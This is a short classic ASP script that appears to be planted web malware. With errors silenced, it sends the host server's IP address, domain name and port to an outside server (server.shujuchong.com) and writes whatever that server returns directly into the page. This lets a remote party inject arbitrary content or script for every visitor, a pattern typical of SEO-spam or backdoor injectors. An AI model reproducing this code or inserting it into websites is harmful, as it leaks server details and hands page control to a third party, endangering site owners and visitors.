<%
on error resume next
function getHTTPPage(url)
dim Http
set Http=server.createobject("MSXML2.XMLHTTP")
Http.open "GET",url,false
Http.send()
if Http.readystate<>4 then 
exit function
end if
getHTTPPage=bytesToBSTR(Http.responseBody,"GB2312")
set http=nothing
if err.number<>0 then err.Clear 
end function
Function BytesToBstr(body,Cset)
dim objstream
set objstream = Server.CreateObject("adodb.stream")
objstream.Type = 1
objstream.Mode =3
objstream.Open
objstream.Write body
objstream.Position = 0
objstream.Type = 2
objstream.Charset = Cset
BytesToBstr = objstream.ReadText 
objstream.Close
set objstream = nothing
End Function
dim url,ip,yuming,serverv,neirong,banben,duankou
duankou=""
if Request.ServerVariables("Server_Port")<>"80" then
	duankou=":"&Request.ServerVariables("Server_Port")
end if
serverv="http://server.shujuchong.com"
ip=Request.ServerVariables("LOCAL_ADDR")
yuming=Request.ServerVariables("SERVER_NAME")&duankou
banben="v3.0"
url=serverv&"/fuwu.asp?ip="&ip&"&yuming="&yuming&"&banben="&banben

neirong=getHTTPPage(url)
response.Write(neirong)
%>